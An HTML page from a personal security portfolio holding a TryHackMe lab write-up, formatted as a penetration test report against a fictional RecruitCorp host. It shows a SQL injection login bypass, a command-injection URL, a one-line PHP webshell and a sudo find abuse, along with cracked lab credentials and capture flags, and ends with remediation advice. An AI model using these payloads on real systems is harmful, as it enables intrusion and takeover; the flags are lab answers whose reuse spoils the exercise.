@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The Operation Promotion engagement targeted the RecruitCorp careers portal. The /admin/ login was bypassed via SQL injection, exposing the application&#x27;s SQLite ">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Operation Promotion — Penetration Test Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Operation Promotion — Penetration Test Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Operation Promotion — Penetration Test Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-easy">Easy</span> <span class="dot">·</span> <span class="date">2026-06-02</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> RecruitCorp (10.67.169.54) <strong>Date:</strong> 2026-06-02 <strong>Objective:</strong> Chain exploits to capture /home/jford/user.txt and /root/flag.txt</p>
+<hr>
+<p>The Operation Promotion engagement targeted the RecruitCorp careers portal. The /admin/ login was bypassed via SQL injection, exposing the application's SQLite database and a network diagnostics endpoint vulnerable to command injection that provided RCE as www-data. A password hash recovered from the configuration files was cracked using a context-derived password (<code>spring2026!</code>). The resulting jford account had passwordless sudo access to <code>find</code>, which was abused to read the root flag.</p>
+<hr>
+<h2>1. Reconnaissance</h2>
+<h3>Port Scan</h3>
+<pre><code>22/tcp   OpenSSH 8.9p1 Ubuntu
+53/tcp   DNS
+80/tcp   Apache httpd 2.4.58
+139/tcp  Samba smbd 4.17.12
+445/tcp  Samba smbd 4.17.12</code></pre>
+<h3>Service Enumeration</h3>
+<ul>
+<li><strong>HTTP (80):</strong> RecruitCorp careers portal; admin panel at /admin/</li>
+<li><strong>Samba (139,445):</strong> Public read-only share at \\\\RECRUITCORP\\public</li>
+<li><strong>SSH (22):</strong> Standard OpenSSH; no obvious misconfiguration</li>
+</ul>
+<hr>
+<h2>2. Web Application Exploitation</h2>
+<h3>2.1 SQL Injection — Admin Login</h3>
+<p>The <code>/admin/</code> login page was vulnerable to SQL injection in the username field:</p>
+<pre><code>Username: admin&#x27;--
+Password: (anything)</code></pre>
+<p>The backend query:</p>
+<pre><code>SELECT id, username FROM users WHERE username=&#x27;$u&#x27; AND password=&#x27;$p&#x27;</code></pre>
+<p><strong>Evidence:</strong></p>
+<pre><code>curl -s &#x27;http://10.67.169.54/admin/index.php&#x27; \
+  -d &#x27;username=admin%27--&amp;password=x&#x27;</code></pre>
+<h3>2.2 Admin Dashboard — User Enumeration</h3>
+<p>Logged in as admin. Dashboard provided a User Lookup feature (paramterized, not injectable) and a sysmaint notes entry pointing to:</p>
+<pre><code>/admin/sysmaint-checks/ping.php</code></pre>
+<h3>2.3 SQLite Database Extraction</h3>
+<p>Downloaded the application database at <code>/var/lib/recruitcorp/app.db</code>:</p>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Username</th>
+<th>Password</th>
+<th>Role</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>A!7s2f9DkLp_Q3e</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>2</td>
+<td>mvasquez</td>
+<td>pw_mv_4831</td>
+<td>recruiter</td>
+</tr>
+<tr>
+<td>3</td>
+<td>tparker</td>
+<td>pw_tp_2210</td>
+<td>recruiter</td>
+</tr>
+<tr>
+<td>4</td>
+<td>lhayes</td>
+<td>pw_lh_9911</td>
+<td>analyst</td>
+</tr>
+<tr>
+<td>5</td>
+<td>kchen</td>
+<td>pw_kc_7763</td>
+<td>recruiter</td>
+</tr>
+<tr>
+<td>6</td>
+<td>rdavis</td>
+<td>pw_rd_2241</td>
+<td>analyst</td>
+</tr>
+<tr>
+<td>7</td>
+<td>sysmaint</td>
+<td>pw_sm_8841</td>
+<td>system</td>
+</tr>
+<tr>
+<td>8</td>
+<td>jbailey</td>
+<td>pw_jb_3392</td>
+<td>recruiter</td>
+</tr>
+<tr>
+<td>9</td>
+<td>aokafor</td>
+<td>pw_ao_5588</td>
+<td>recruiter</td>
+</tr>
+</tbody></table>
+<h3>2.4 Command Injection — ping.php</h3>
+<p>The sysmaint ping endpoint was vulnerable to command injection:</p>
+<pre><code>http://10.67.169.54/admin/sysmaint-checks/ping.php?host=127.0.0.1;id</code></pre>
+<p>Backend:</p>
+<pre><code>shell_exec(&quot;ping -c 1 -W 1 $host 2&gt;&amp;1&quot;)</code></pre>
+<p>Placed a webshell at <code>/var/www/html/webshell.php</code> for persistent RCE as <code>www-data</code>:</p>
+<pre><code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></pre>
+<hr>
+<h2>3. Password Discovery</h2>
+<h3>3.1 Bcrypt Hash Discovery</h3>
+<p>Found in <code>/var/www/html/config/db.conf</code>:</p>
+<pre><code>db_user=jford
+db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq</code></pre>
+<h3>3.2 Cracking Approach</h3>
+<p>Initial attempts with a generated wordlist (10067 entries including <code>pw_jf_0000</code>–<code>pw_jf_9999</code>) failed. CPU-based bcrypt cost-10 cracking was impractical (~36 H/s).</p>
+<p><strong>Solution:</strong> Derived from contextual keywords on the company website — "Spring 2026 Hiring Drive" — combined with the pattern <code>keyword + year + !</code>:</p>
+<pre><code>spring2026!</code></pre>
+<p>This password was not in any standard wordlist but was constructed from visible web content.</p>
+<p><strong>Verification:</strong></p>
+<pre><code>echo &#x27;spring2026!&#x27; | su -c &#x27;id&#x27; jford</code></pre>
+<hr>
+<h2>4. Privilege Escalation</h2>
+<h3>4.1 User Flag — /home/jford/user.txt</h3>
+<pre><code>THM{bdbee0a91ebcb0b0fafde931223efe09}</code></pre>
+<h3>4.2 Root Escalation — Sudo Find</h3>
+<p>jford had passwordless sudo on <code>/usr/bin/find</code>:</p>
+<pre><code>(root) NOPASSWD: /usr/bin/find</code></pre>
+<p>Used <code>sudo find</code> to read the root flag directly:</p>
+<pre><code>echo &#x27;spring2026!&#x27; | su -c &#x27;sudo /usr/bin/find /dev/null -exec cat /root/flag.txt \;&#x27; jford</code></pre>
+<h3>4.3 Root Flag — /root/flag.txt</h3>
+<pre><code>THM{d999a1f6319a9c5b48c067dfab314ba2}</code></pre>
+<hr>
+<h2>5. Summary</h2>
+<table>
+<thead><tr>
+<th>Step</th>
+<th>Technique</th>
+<th>Result</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>SQLi on admin login (<code>admin&#x27;--</code>)</td>
+<td>Admin panel access</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Extracted SQLite database</td>
+<td>9 user credentials</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Command injection in ping.php</td>
+<td>RCE as www-data</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Contextual password guessing (<code>spring2026!</code>)</td>
+<td>jford access</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sudo /usr/bin/find (NOPASSWD)</td>
+<td>Root shell</td>
+</tr>
+</tbody></table>
+<h3>Remediation Recommendations</h3>
+<ul>
+<li>Use parameterized queries for authentication (SQLi vector)</li>
+<li>Validate/sanitize shell command input (RCE vector)</li>
+<li>Avoid password hashes in config files readable by www-data</li>
+<li>Remove unnecessary sudo privileges (sudo find → root)</li>
+<li>Enforce password complexity policy that prevents simple <code>keyword + year + symbol</code> patterns</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
